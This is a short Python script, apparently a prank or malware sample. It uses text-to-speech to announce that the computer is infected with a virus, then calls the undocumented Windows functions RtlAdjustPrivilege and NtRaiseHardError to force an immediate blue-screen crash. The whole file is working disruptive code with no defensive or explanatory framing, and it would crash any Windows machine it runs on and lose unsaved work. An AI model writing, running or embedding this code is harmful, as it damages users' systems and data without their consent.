import pyttsx3 as tts
import time
import ctypes


engine =  tts.init()
engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
engine.runAndWait()

def bluescreen():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))

bluescreen()
